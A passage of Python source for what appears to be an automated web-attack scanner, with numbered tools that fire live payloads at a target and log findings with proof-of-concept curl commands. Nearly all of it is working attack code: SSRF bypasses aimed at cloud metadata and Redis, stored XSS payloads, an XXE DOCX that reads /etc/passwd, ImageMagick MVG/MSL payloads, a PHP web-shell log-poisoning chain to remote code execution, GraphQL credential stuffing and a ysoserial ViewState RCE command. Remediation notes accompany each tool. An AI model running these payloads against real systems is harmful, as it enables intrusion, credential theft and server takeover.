                                f"python3 -c \""
                                "from joserfc import jwe; "
                                "from joserfc.jwk import OctKey; "
                                "[jwe.decrypt_compact('{token[:40]}...', OctKey.import_key(k.encode())) "
                                "for k in open('wordlist.txt')]\""
                            ),
                            category="Cryptography",
                            remediation="Use RSA-OAEP or ECDH-ES for key wrapping. Never use alg=dir with password-derived keys. Minimum 256-bit random key."
                        ))
                        return profile
            except Exception:
                pass
        return profile

# ── Tool 131: .NET ViewState MAC Bypass (SKILL-141) ───────────
class ViewStateMACBypass:
    """Detect .NET ViewState without MAC validation or with weak machine key."""
    NAME = "ViewState MAC Bypass"
    VIEWSTATE_PAT = re.compile(
        r'<input[^>]+__VIEWSTATE[^>]+value=["\']([A-Za-z0-9+/=]{20,})["\']', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import base64 as _b64
        r = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not r or not r.body:
            return profile
        body = r.body.decode("utf-8", errors="replace")
        m = self.VIEWSTATE_PAT.search(body)
        if not m:
            return profile
        vs_b64 = m.group(1)
        try:
            vs_bytes = _b64.b64decode(vs_b64 + "==")
        except Exception:
            return profile
        # Check if ViewState ends with a MAC (last 20 bytes = SHA1 HMAC usually)
        has_generator = bool(re.search(r'__VIEWSTATEGENERATOR', body, re.I))
        # HMAC-less ViewState: if it can be decoded as pure object graph without hash suffix
        # In practice: try to flip a byte and resubmit — if accepted, no MAC
        flipped = bytearray(vs_bytes)
        if len(flipped) > 10:
            flipped[5] ^= 0xFF
        flipped_b64 = _b64.b64encode(bytes(flipped)).decode()
        try:
            r2 = _fetch(profile.url, cfg.ua, cfg.timeout, "POST",
                        f"__VIEWSTATE={flipped_b64}&__VIEWSTATEGENERATOR=test".encode(),
                        {"Content-Type": "application/x-www-form-urlencoded"})
            if r2 and r2.status == 200:
                body2 = (r2.body or b"").decode("utf-8", errors="replace")
                if "viewstate" in body2.lower() and "error" not in body2.lower():
                    profile.findings.append(Finding(
                        id="VIEWSTATE-NO-MAC",
                        title=".NET ViewState accepted without MAC validation — object injection risk",
                        severity="CRITICAL",
                        cvss=9.8,
                        cwe="CWE-502",
                        description=(
                            "Modified ViewState returned HTTP 200 without error. "
                            "ViewState MAC may be disabled (enableViewStateMac=false). "
                            "Deserialisation of attacker-crafted ViewState can lead to RCE."
                        ),
                        poc_curl=(
                            "# Generate malicious ViewState with ysoserial.net:\n"
                            "ysoserial.exe -p ViewState -g TypeConfuseDelegate "
                            "-c 'powershell -e BASE64_PAYLOAD' "
                            f"--path='{profile.url}' --apppath=/ --islegacy\n"
                            f"curl -sk -X POST {profile.url} -d '__VIEWSTATE=MALICIOUS'"
                        ),
                        category="Deserialization",
                        remediation="Enable ViewState MAC (enableViewStateMac=true). Set a strong machineKey. Upgrade to .NET Framework 4.5.2+ which enforces MAC by default."
                    ))
        except Exception:
            pass
        # Always flag ViewState presence
        profile.findings.append(Finding(
            id="VIEWSTATE-PRESENT",
            title=".NET ViewState detected — verify MAC enforcement and machine key strength",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-502",
            description=f"__VIEWSTATE found ({len(vs_b64)} chars). Generator present: {has_generator}.",
            poc_curl=f"curl -sk {profile.url} | grep -oP '__VIEWSTATE[^\"]+\"[^\"]+\"'",
            category="Deserialization",
            remediation="Ensure enableViewStateMac=true and use a randomly generated 64-byte machineKey in web.config."
        ))
        return profile

# ── Tool 132: SSRF URL Parser Bypass (SKILL-142) ──────────────
class SSRFURLParserBypass:
    """Test SSRF blocklist bypasses via @ notation, unicode, and parser confusion."""
    NAME = "SSRF URL Parser Bypass"
    BYPASS_PAYLOADS = [
        "http://evil.com@169.254.169.254/latest/meta-data/",
        "http://169.254.169.254#@evil.com/",
        "http://169.254.169.254%252F%252F",
        "http://0x7f000001/",          # 127.0.0.1 hex
        "http://2130706433/",           # 127.0.0.1 decimal
        "http://[::ffff:169.254.169.254]/",  # IPv6-mapped
        "http://localhost.evil.com@169.254.169.254/",
        "http://169。254。169。254/",      # Unicode dots
        "http://169.254.169.254\t/",    # Tab bypass
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO%0A",
    ]
    SSRF_PARAMS = ["url", "src", "href", "path", "proxy", "redirect",
                   "uri", "image", "load", "resource", "fetch"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.SSRF_PARAMS[:5]:
            for pl in self.BYPASS_PAYLOADS[:5]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, 8)
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    if any(k in body for k in ["ami-id", "instance-id", "hostname",
                                               "INFO\r\n", "+PONG", "redis_version"]):
                        profile.findings.append(Finding(
                            id="SSRF-BYPASS",
                            title=f"SSRF blocklist bypass via URL parser confusion: {pl[:40]}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-918",
                            description=f"SSRF bypass payload '{pl[:60]}' via '{param}' reached an internal endpoint. Response contains internal data.",
                            poc_curl=f"curl -sk '{url}'",
                            category="SSRF",
                            remediation="Resolve and validate URLs after full parsing. Block all RFC1918+loopback IPs post-resolution. Use a dedicated SSRF-safe HTTP client library."
                        ))
                        return profile
                except Exception:
                    pass
        # Always emit bypass PoC list
        profile.findings.append(Finding(
            id="SSRF-BYPASS-POC",
            title="SSRF URL parser bypass payloads generated — manual verification required",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-918",
            description="11 SSRF blocklist bypass variants generated for manual testing with Burp Collaborator.",
            poc_curl="\n".join(f"curl -sk '{profile.url}/?url={p}'" for p in self.BYPASS_PAYLOADS[:5]),
            category="SSRF",
            remediation="Allowlist by resolved IP, not URL string. Parse URL server-side with a strict library before any fetch."
        ))
        return profile

# ── Tool 133: DNS Rebinding Hints (SKILL-143) ─────────────────
class DNSRebindingHints:
    """Generate DNS rebinding attack surface report for the target."""
    NAME = "DNS Rebinding Hints"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import socket
        try:
            ip = socket.gethostbyname(profile.host)
        except Exception:
            ip = "unknown"
        # Check CORS origin: null (sandbox iframe rebinding)
        r_null = None
        try:
            r_null = _fetch(profile.url, cfg.ua, cfg.timeout,
                            headers_extra={"Origin": "null"})
        except Exception:
            pass
        acao_null = r_null.headers.get("access-control-allow-origin", "") if r_null else ""
        is_private = any(ip.startswith(p) for p in
                         ["10.", "192.168.", "172.16.", "172.17.",
                          "172.18.", "172.19.", "172.2", "172.3",
                          "127.", "0."])
        profile.findings.append(Finding(
            id="DNS-REBIND-SURFACE",
            title=f"DNS rebinding attack surface assessment for {profile.host}",
            severity="HIGH" if is_private else "MEDIUM",
            cvss=8.1 if is_private else 5.4,
            cwe="CWE-346",
            description=(
                f"Host {profile.host} resolves to {ip} ({'PRIVATE — direct rebinding possible' if is_private else 'public'}).\n"
                f"CORS Origin: null → ACAO: '{acao_null}'\n"
                "DNS rebinding: attacker DNS record oscillates between attacker IP and target IP. "
                "Browser then allows cross-origin requests to the re-bound address. "
                "Services trusting Host header or lacking CSRF protection are vulnerable."
            ),
            poc_curl=(
                f"# DNS rebinding PoC (use singularity or rebind.network):\n"
                f"# 1. Register attacker domain with short TTL → your IP\n"
                f"# 2. Victim browser loads attacker page\n"
                f"# 3. DNS flips to {ip}\n"
                f"# 4. XHR to http://attacker-domain/ now hits {profile.host}\n"
                f"curl -sk {profile.url} -H 'Host: attacker-rebind.example.com'"
            ),
            category="DNS",
            remediation="Validate Host header against a strict allowlist. Set DNS TTL ≥ 300s. Bind services to specific IPs, not 0.0.0.0. Require CSRF tokens."
        ))
        return profile

# ── Tool 134: GraphQL Alias Credential Stuffing (SKILL-144) ───
class GraphQLAliasCredStuff:
    """Use GraphQL alias batching to brute-force credentials in a single request."""
    NAME = "GraphQL Alias CredStuff"
    COMMON_PASSWORDS = ["123456", "password", "admin", "test123",
                        "letmein", "welcome", "qwerty", "abc123",
                        "Password1", "Test@1234"]
    GQL_PATHS = ["/graphql", "/api/graphql", "/gql"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for ep in self.GQL_PATHS[:3]:
            url = profile.url.rstrip("/") + ep
            # Build batched alias login mutations
            aliases = "\n".join(
                f'a{i}: login(input:{{email:"admin@example.com",password:"{pw}"}}){{token}}'
                for i, pw in enumerate(self.COMMON_PASSWORDS)
            )
            payload = json.dumps({"query": f"mutation{{{aliases}}}"}).encode()
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, "POST", payload,
                           {"Content-Type": "application/json"})
                if not r or not r.body:
                    continue
                body = r.body.decode("utf-8", errors="replace")
                # If server processed multiple aliases without rate-limiting
                alias_count = body.count('"a') + body.count('"login"')
                if alias_count >= 3 and "errors" not in body.lower():
                    profile.findings.append(Finding(
                        id="GQL-ALIAS-CRED-STUFF",
                        title=f"GraphQL alias batching allows credential stuffing — no rate limit on {ep}",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-307",
                        description=(
                            f"10 login aliases processed in single request at {ep}. "
                            "No per-alias rate limiting detected. Attacker can attempt "
                            "thousands of passwords in one HTTP request."
                        ),
                        poc_curl=(
                            f"curl -sk -X POST {url} -H 'Content-Type: application/json' "
                            f"-d '{payload.decode()[:100]}...'"
                        ),
                        category="Brute Force",
                        remediation="Rate-limit per resolver invocation, not per HTTP request. Limit alias count per query. Implement CAPTCHA on login mutations."
                    ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 135: Stored XSS in API String Fields (SKILL-145) ─────
class StoredXSSProbe:
    """Inject XSS payloads into writable API string fields and verify reflection."""
    NAME = "Stored XSS Probe"
    XSS_MARKER = "apexXSS9z3"
    XSS_PAYLOADS = [
        f'<img src=x onerror=eval(atob("APEX"))>',
        f'<svg/onload=confirm("{XSS_MARKER}")>',
        f'javascript:alert("{XSS_MARKER}")',
        f'"><script>/*{XSS_MARKER}*/</script>',
        f"';alert('{XSS_MARKER}')//",
    ]
    WRITE_PATHS = [
        ("/api/profile",  "PUT",  {"bio": None, "name": None}),
        ("/api/user",     "PATCH", {"displayName": None, "about": None}),
        ("/api/comments", "POST", {"body": None, "content": None}),
        ("/api/messages", "POST", {"text": None, "message": None}),
        ("/api/feedback", "POST", {"message": None, "feedback": None}),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path, method, fields in self.WRITE_PATHS:
            url = profile.url.rstrip("/") + path
            for pl in self.XSS_PAYLOADS[:3]:
                body_dict = {k: pl for k in fields}
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, method,
                               json.dumps(body_dict).encode(),
                               {"Content-Type": "application/json"})
                    if not r:
                        continue
                    resp = (r.body or b"").decode("utf-8", errors="replace")
                    if r.status in (200, 201) and (pl in resp or self.XSS_MARKER in resp):
                        profile.findings.append(Finding(
                            id="STORED-XSS",
                            title=f"Stored XSS payload reflected in {method} {path} response",
                            severity="HIGH",
                            cvss=8.7,
                            cwe="CWE-79",
                            description=(
                                f"XSS payload '{pl[:60]}' was submitted to {path} "
                                f"and reflected back in the HTTP {r.status} response body. "
                                "Indicates the value is stored and re-rendered without escaping."
                            ),
                            poc_curl=(
                                f"curl -sk -X {method} {url} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{json.dumps(body_dict)}'"
                            ),
                            category="XSS",
                            remediation="HTML-encode all user-supplied strings before rendering. Use a Content Security Policy. Apply output encoding at the template level."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 136: XXE via DOCX / XLSX Upload (SKILL-146) ──────────
class XXEFileUploadDocx:
    """Inject XXE payloads into DOCX/XLSX/PPTX XML internals for file-upload endpoints."""
    NAME = "XXE via DOCX/XLSX Upload"
    UPLOAD_PATHS = ["/api/upload", "/api/import", "/api/document",
                    "/api/documents", "/upload", "/import",
                    "/api/spreadsheet", "/api/report/import"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import io, zipfile
        for path in self.UPLOAD_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r0 = _fetch(url, cfg.ua, cfg.timeout)
                if not r0 or r0.status not in (200, 400, 405, 413, 415, 422):
                    continue
                # Build a minimal DOCX (ZIP) with XXE in [Content_Types].xml
                xxe_content_types = (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                    '<Default Extension="rels" ContentType="&xxe;"/>'
                    '</Types>'
                )
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                    zf.writestr("[Content_Types].xml", xxe_content_types)
                    zf.writestr("word/document.xml",
                                '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
                                '<w:body><w:p><w:r><w:t>test</w:t></w:r></w:p></w:body></w:document>')
                    zf.writestr("_rels/.rels",
                                '<?xml version="1.0"?><Relationships '
                                'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                                '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
                                '2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
                docx_bytes = buf.getvalue()
                boundary = b"----ApexXXEBoundary"
                body = (
                    b"--" + boundary + b"\r\n"
                    b'Content-Disposition: form-data; name="file"; filename="test.docx"\r\n'
                    b"Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document\r\n\r\n"
                    + docx_bytes + b"\r\n--" + boundary + b"--\r\n"
                )
                r = _fetch(url, cfg.ua, cfg.timeout, "POST", body,
                           {"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"})
                if r and r.body:
                    resp = r.body.decode("utf-8", errors="replace")
                    if "root:" in resp or "passwd" in resp or r.status == 200:
                        sev = "CRITICAL" if "root:" in resp else "HIGH"
                        profile.findings.append(Finding(
                            id="XXE-DOCX-UPLOAD",
                            title=f"XXE via DOCX upload at {path}" + (" — /etc/passwd read!" if "root:" in resp else ""),
                            severity=sev,
                            cvss=9.8 if sev == "CRITICAL" else 7.5,
                            cwe="CWE-611",
                            description=(
                                f"DOCX file with XXE entity in [Content_Types].xml uploaded to {url}. "
                                + ("Response contains /etc/passwd content." if "root:" in resp
                                   else f"Server processed file (HTTP {r.status}).")
                            ),
                            poc_curl=(
                                f"# Build evil.docx with XXE and upload:\n"
                                f"curl -sk -X POST {url} "
                                f"-F 'file=@evil.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document'"
                            ),
                            category="XXE",
                            remediation="Use a safe OOXML parser with external entity processing disabled. Validate MIME type and magic bytes before parsing."
                        ))
            except Exception:
                pass
        return profile

# ── Tool 137: Server-Timing Info Leak (SKILL-147) ─────────────
class ServerTimingInfoLeak:
    """Detect Server-Timing headers exposing internal component names and durations."""
    NAME = "Server-Timing Info Leak"
    SENSITIVE_COMPS = re.compile(
        r'(?:db|database|redis|mongo|elastic|sql|cache|auth|payment|'
        r'stripe|aws|internal|backend|service|micro)', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        paths = ["/", "/api", "/api/v1", "/api/me", "/api/search"]
        for path in paths:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                st = r.headers.get("server-timing", "")
                if not st:
                    continue
                matches = self.SENSITIVE_COMPS.findall(st)
                profile.findings.append(Finding(
                    id="SERVER-TIMING-LEAK",
                    title=f"Server-Timing header exposes internal components: {st[:80]}",
                    severity="LOW" if not matches else "MEDIUM",
                    cvss=3.7 if not matches else 5.3,
                    cwe="CWE-200",
                    description=(
                        f"Server-Timing at {path}: {st[:120]}. "
                        + (f"Sensitive component names: {matches}" if matches
                           else "Timing data reveals request processing profile.")
                    ),
                    poc_curl=f"curl -sk -I {url} | grep -i server-timing",
                    category="Information Disclosure",
                    remediation="Remove or sanitise Server-Timing headers in production. Only expose aggregate timings, never component names."
                ))
                return profile
            except Exception:
                pass
        return profile

# ── Tool 138: NoSQL Blind Timing Injection (SKILL-148) ────────
class NoSQLBlindTiming:
    """Time-based blind NoSQL injection via $where with sleep() in MongoDB."""
    NAME = "NoSQL Blind Timing"
    # $where with sleep — MongoDB only; 0ms actual delay (safe)
    TIMING_PAYLOADS = [
        ('{"$where":"sleep(0)||1==1"}', "where-sleep"),
        ('{"$where":"function(){sleep(0);return true;}"}', "where-func"),
        ('{"username":{"$regex":"a*","$where":"sleep(0)"}}', "regex-where"),
    ]
    PARAMS = [("username", "password"), ("user", "pass"),
              ("email", "password"), ("login", "pwd")]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import time as _t
        for p1, p2 in self.PARAMS[:3]:
            baseline_times = []
            for _ in range(2):
                t0 = _t.time()
                try:
                    _fetch(profile.url, cfg.ua, cfg.timeout, "POST",
                           json.dumps({p1: "normal_user", p2: "normal_pass"}).encode(),
                           {"Content-Type": "application/json"})
                except Exception:
                    pass
                baseline_times.append(_t.time() - t0)
            baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 1.0
            for payload_str, label in self.TIMING_PAYLOADS[:2]:
                try:
                    payload_dict = json.loads(payload_str)
                    full_body = json.dumps({p1: payload_dict, p2: "x"}).encode()
                    t0 = _t.time()
                    r = _fetch(profile.url, cfg.ua, cfg.timeout, "POST", full_body,
                               {"Content-Type": "application/json"})
                    elapsed = _t.time() - t0
                    if elapsed > baseline * 2.5 and r and r.status != 500:
                        profile.findings.append(Finding(
                            id=f"NOSQL-BLIND-TIMING-{label.upper()}",
                            title=f"NoSQL blind timing injection via $where ({label}) on '{p1}'",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-943",
                            description=(
                                f"Request with $where:{label} took {elapsed:.2f}s vs baseline {baseline:.2f}s. "
                                "MongoDB $where clause may be executing JavaScript — "
                                "larger sleep values can confirm and allow blind data extraction."
                            ),
                            poc_curl=(
                                f"curl -sk -X POST {profile.url} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{full_body.decode()}'"
                            ),
                            category="Injection",
                            remediation="Disable $where and server-side JavaScript in MongoDB (--noscripting). Use Mongoose schema types to reject operator objects."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 139: ImageMagick / GraphicsMagick SSRF (SKILL-149) ───
class ImageMagickSSRF:
    """Detect SSRF and file-read via ImageMagick delegate rules in image upload."""
    NAME = "ImageMagick SSRF"
    IMG_PATHS = ["/api/upload", "/api/image", "/api/avatar",
                 "/api/thumbnail", "/api/resize", "/upload",
                 "/api/images", "/api/convert"]
    # MSL / MVG payloads for ImageMagick SSRF (CVE-2016-3714 family)
    MSL_PAYLOAD = b"""<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="http://169.254.169.254/latest/meta-data/" />
  <write filename="/tmp/apex_imagemagick_out.txt" />
</image>"""
    MVG_PAYLOAD = b'push graphic-context\nviewbox 0 0 640 480\nfill "url(http://169.254.169.254/latest/meta-data/)"\npop graphic-context'
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.IMG_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r0 = _fetch(url, cfg.ua, cfg.timeout)
                if not r0 or r0.status not in (200, 400, 405, 413, 415, 422):
                    continue
                for payload, ext, ctype, label in [
                    (self.MVG_PAYLOAD, "image.mvg", "image/svg+xml", "MVG"),
                    (self.MSL_PAYLOAD, "payload.msl", "text/xml", "MSL"),
                ]:
                    boundary = b"----ApexIMBound"
                    body = (
                        b"--" + boundary + b"\r\n"
                        + f'Content-Disposition: form-data; name="file"; filename="{ext}"\r\n'.encode()
                        + f"Content-Type: {ctype}\r\n\r\n".encode()
                        + payload + b"\r\n--" + boundary + b"--\r\n"
                    )
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", body,
                               {"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"})
                    if r and r.body:
                        resp = r.body.decode("utf-8", errors="replace")
                        if any(k in resp for k in ["ami-id", "instance-id", "meta-data",
                                                    "ImageMagick", "convert:"]):
                            profile.findings.append(Finding(
                                id=f"IMAGEMAGICK-{label}-SSRF",
                                title=f"ImageMagick {label} SSRF/file-read via upload at {path}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-918",
                                description=f"ImageMagick processed {label} payload at {path} and response contains SSRF/metadata data.",
                                poc_curl=f"curl -sk -X POST {url} -F 'file=@payload.{ext.split('.')[-1]}'",
                                category="SSRF",
                                remediation="Disable ImageMagick MSL and MVG decoders in policy.xml. Validate file magic bytes. Use a sandboxed converter."
                            ))
                            return profile
                profile.findings.append(Finding(
                    id=f"IMAGEMAGICK-UPLOAD-SURFACE",
                    title=f"Image upload endpoint — assess ImageMagick SSRF: {path}",
                    severity="INFO",
                    cvss=0.0,
                    cwe="CWE-918",
                    description=f"Upload endpoint {url} active ({r0.status}). Manually test MVG/MSL payloads for ImageMagick delegate SSRF.",
                    poc_curl=f"curl -sk -X POST {url} -F 'file=@payload.mvg'",
                    category="SSRF",
                    remediation="Restrict ImageMagick to safe coders only in /etc/ImageMagick-*/policy.xml."
                ))
            except Exception:
                pass
        return profile

# ── Tool 140: File Inclusion → RCE via Log Poison (SKILL-150) ─
class LFItoRCELogPoison:
    """Chain LFI with log poisoning to achieve RCE via /proc/self/fd or access.log."""
    NAME = "LFI → RCE Log Poison"
    LFI_PARAMS = ["file", "page", "path", "include", "document",
                  "view", "template", "doc", "filename"]
    LOG_FILES = [
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/apache/access.log",
        "/proc/self/fd/2",
        "/proc/self/environ",
        "/var/log/auth.log",
        "/var/log/syslog",
    ]
    PHP_POISON = "<?php system($_GET['cmd']); ?>"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        # Step 1: poison the log by putting PHP in User-Agent
        poison_ua = self.PHP_POISON
        for lf in self.LOG_FILES[:3]:
            for param in self.LFI_PARAMS[:4]:
                url_lfi = profile.url.rstrip("/") + f"/?{param}={lf}"
                try:
                    # Poison via User-Agent in a preliminary request
                    _fetch(profile.url, poison_ua, cfg.timeout)
                    # Then try LFI to include the poisoned log
                    r = _fetch(url_lfi, cfg.ua, cfg.timeout)
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    if "root:" in body or "apache" in body.lower() or "nginx" in body.lower():
                        # LFI working — log may contain PHP marker
                        if self.PHP_POISON[:10] in body or "system(" in body:
                            profile.findings.append(Finding(
                                id="LFI-RCE-LOGPOISON",
                                title=f"LFI → RCE via log poisoning: {param}={lf}",
                                severity="CRITICAL",
                                cvss=10.0,
                                cwe="CWE-98",
                                description=(
                                    f"LFI via '{param}' reads {lf}. PHP payload in User-Agent "
                                    "was poisoned into the log and is now executable via LFI. "
                                    "Confirmed RCE chain."
                                ),
                                poc_curl=(
                                    f"# Step 1 — poison log:\n"
                                    f"curl -sk {profile.url} -A '{self.PHP_POISON}'\n"
                                    f"# Step 2 — execute:\n"
                                    f"curl -sk '{url_lfi}&cmd=id'"
                                ),
                                category="RCE",
                                remediation="Disable allow_url_include. Validate LFI paths with realpath() whitelist. Rotate and restrict log file permissions."
                            ))
                            return profile
                        # LFI works but no PHP code execution yet
                        profile.findings.append(Finding(
                            id="LFI-LOG-READ",
                            title=f"LFI reads log file '{lf}' — attempt log poisoning for RCE",
                            severity="HIGH",
                            cvss=8.8,
                            cwe="CWE-98",
                            description=f"Parameter '{param}' includes {lf}. Log poisoning: send PHP in User-Agent then LFI.",
                            poc_curl=(
                                f"curl -sk {profile.url} -A '<?php system($_GET[\"c\"]);?>'\n"
                                f"curl -sk '{url_lfi}&c=id'"
                            ),
                            category="RCE",
                            remediation="Whitelist allowed include paths. Set open_basedir. Restrict log file permissions."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 141: HTTP Method Override SSRF (SKILL-151) ───────────
class HTTPMethodOverrideSSRF:
    """Test method override headers to bypass WAF and reach DELETE/PUT endpoints."""
    NAME = "HTTP Method Override SSRF"
    OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override",
        "X-HTTP-Method",
        "X-Method-Override",
        "_method",
    ]
    TARGETS = [
        ("DELETE", "/api/users/1"),
        ("DELETE", "/api/admin/users/1"),
        ("PUT",    "/api/users/1"),
        ("PATCH",  "/api/users/1"),
        ("DELETE", "/api/items/1"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for real_method, path in self.TARGETS[:5]:
            url = profile.url.rstrip("/") + path
            for hdr in self.OVERRIDE_HEADERS:
                try:
                    # Send as GET/POST with override header
                    send_method = "POST" if real_method in ("PUT", "PATCH") else "GET"
                    r = _fetch(url, cfg.ua, cfg.timeout, send_method, b"",
                               {hdr: real_method,
                                "Content-Type": "application/x-www-form-urlencoded"})
                    if r and r.status not in (401, 403, 404, 405):
                        profile.findings.append(Finding(
                            id=f"METHOD-OVERRIDE-{real_method}-{hdr.upper()[:15]}",
                            title=f"Method override bypass: {send_method}+{hdr}:{real_method} on {path}",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-650",
                            description=(
                                f"Sending {send_method} with '{hdr}: {real_method}' to {path} "
                                f"returned HTTP {r.status}, bypassing method restriction. "
                                "WAF rules filtering by HTTP method can be bypassed this way."
                            ),
                            poc_curl=(
                                f"curl -sk -X {send_method} {url} "
                                f"-H '{hdr}: {real_method}'"
                            ),
                            category="Access Control",
                            remediation="Do not honour method-override headers on sensitive endpoints. Disable X-HTTP-Method-Override globally or restrict to authenticated clients."
                        ))
                except Exception:
                    pass
        return profile

# ── Tool 142: Session Token Entropy Analysis (SKILL-152) ──────
class SessionTokenEntropy:
    """Analyse session token length, charset, and Shannon entropy for predictability."""
    NAME = "Session Token Entropy"
    import math as _math
    def _entropy(self, token: str) -> float:
        from math import log2
        freq = {}
        for c in token:
            freq[c] = freq.get(c, 0) + 1
        n = len(token)
        return -sum((f/n) * log2(f/n) for f in freq.values()) if n else 0.0
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        # Collect session cookies from two requests
        tokens = []
        for _ in range(3):
            try:
                r = _fetch(profile.url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                sc = r.headers.get("set-cookie", "")
                for part in sc.split(";"):
                    if "=" in part and any(k in part.lower() for k in
                                           ["session", "sess", "token", "auth", "sid"]):
                        val = part.strip().split("=", 1)[-1].strip()
                        if len(val) > 6:
                            tokens.append(val)
            except Exception:
                pass
        if not tokens:
            return profile
        for token in tokens[:3]:
            entropy = self._entropy(token)
            issues = []
            if len(token) < 16:
                issues.append(f"short ({len(token)} chars)")
            if entropy < 3.5:
                issues.append(f"low entropy ({entropy:.2f} bits/char)")
            if re.match(r'^[0-9]+$', token):
                issues.append("numeric only")
            if re.match(r'^[a-f0-9]+$', token, re.I) and len(token) <= 32:
                issues.append(f"possible MD5/SHA1 ({len(token)} hex chars)")
            if issues:
                profile.findings.append(Finding(
                    id="SESSION-ENTROPY-WEAK",
                    title=f"Weak session token: {', '.join(issues)}",
                    severity="HIGH",
                    cvss=7.5,
                    cwe="CWE-330",
                    description=(
                        f"Session token '{token[:20]}...' ({len(token)} chars, "
                        f"entropy={entropy:.2f} bits/char). Issues: {', '.join(issues)}."
                    ),
                    poc_curl=(
                        f"# Collect tokens and analyse:\n"
                        f"for i in $(seq 20); do "
                        f"curl -sk -I {profile.url} | grep -i set-cookie; done | "
                        f"sort | uniq -c | sort -rn"
                    ),
                    category="Session Management",
                    remediation="Use cryptographically random session IDs: min 128 bits from /dev/urandom. Use framework-provided session generators."
                ))
                break
        return profile

# ── Tool 143: CORS Private Network Access Bypass (SKILL-153) ──
class CORSPrivateNetworkAccess:
    """Test CORS Private Network Access (PNA) — Chrome's new CORS-PNA headers."""
    NAME = "CORS Private Network Access"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api", "/api/v1", "/api/me", "/", "/api/internal"]
        for path in api_paths[:4]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, headers_extra={
                    "Origin": "http://localhost",
                    "Access-Control-Request-Private-Network": "true",
                    "Access-Control-Request-Method": "GET",
                })
                if not r:
                    continue
                acao = r.headers.get("access-control-allow-origin", "")
                pna = r.headers.get("access-control-allow-private-network", "")
                if "true" in pna.lower() and ("localhost" in acao or acao == "*"):
                    profile.findings.append(Finding(
                        id="CORS-PNA-BYPASS",
                        title=f"CORS Private Network Access allowed from localhost: {path}",
                        severity="HIGH",
                        cvss=7.4,
                        cwe="CWE-942",
                        description=(
                            f"Endpoint {path} returns ACAPN: {pna}, ACAO: {acao}. "
                            "Malicious public page can make credentialed requests to this "
                            "private network endpoint via Chrome's Private Network Access."
                        ),
                        poc_curl=(
                            f"curl -sk '{url}' "
                            f"-H 'Origin: http://localhost' "
                            f"-H 'Access-Control-Request-Private-Network: true' -v 2>&1 "
                            f"| grep -i 'access-control'"
                        ),
                        category="CORS",
                        remediation="Serve Access-Control-Allow-Private-Network: true only to explicitly trusted origins. Never combine with wildcard ACAO."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 144: HTTP Parameter Hiding / Fragmentation (SKILL-154)
class ParameterFragmentation:
    """Bypass WAF parameter inspection via parameter fragmentation and HPP hiding."""
    NAME = "Parameter Fragmentation"
    FRAGMENTATION_TESTS = [
        # Param split across body + query
        {"url_qs": "id=1", "body": "id=2", "label": "qs-body-split"},
        # Null byte param boundary
        {"url_qs": "cmd=normal%00&cmd=injected", "body": None, "label": "null-byte-split"},
        # Array-style hiding
        {"url_qs": "role[]=user&role[admin]=1", "body": None, "label": "array-hide"},
        # Encoded ampersand
